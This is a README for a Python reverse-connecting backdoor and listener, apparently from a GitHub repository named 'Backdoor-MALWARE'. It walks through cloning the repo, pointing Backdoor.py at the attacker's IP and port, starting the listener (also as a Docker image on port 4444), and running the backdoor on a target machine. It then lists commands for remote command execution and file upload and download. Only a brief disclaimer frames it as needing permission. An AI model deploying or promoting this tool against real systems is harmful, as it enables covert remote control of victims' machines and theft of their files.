# Remote Backdoor and Listener

A Python-based remote backdoor and listener setup for remote command execution and file transfer over TCP/IP.

## Project Overview

This project consists of two main components: `Backdoor.py` and `Listener.py`. 

- **Backdoor.py**: Runs on the target machine and connects back to the Listener, allowing remote command execution and file operations such as download and upload.
  
- **Listener.py**: Runs on the attacker's machine, listens for incoming connections from Backdoor instances, and facilitates command execution and file operations remotely.

## Prerequisites

- Python 3.x installed on both the attacker and target machines.

## Dependencies

The project uses standard Python libraries and does not require additional dependencies beyond what is included in the Python standard library.

## Installation and Setup

1. Clone the repository:

   ```sh
   git clone https://github.com/mohdtarique909/Backdoor-MALWARE.git
   cd MALWARE-Backdoor

2. ### Modify the IP address and port in Backdoor.py:

- In Backdoor.py: Update my_backdoor = Backdoor("Your IP Address", Port) with the IP address and port of your Listener.


3. ### Run Listener:

- Start Listening on Attacker Machine

    ```sh
    python Listener.py

Enter your IP address and Port (Same as Backdoor)

4. ### Run Backdoor:

- Execute Backdoor on a Target Machine

    ```sh
    python Backdoor.py


## Docker (listener)

    
    docker run -it --network=host -p 4444:4444 mohdtarique909/backdoor-listener


## Commands

Once connected, you can use the Listener to send commands to the Backdoor:

- To execute system commands on the target: Simply type the command (e.g., ls, dir, whoami) and press Enter.
- To download a file from the target: Type download <file_path> (e.g., download /path/to/file.txt).
- To upload a file to the target: Type upload <local_file_path> (e.g., upload /path/to/local_file.txt).

Note: Be cautious with the usage of this tool and ensure you have legal permission to use it in any environment.
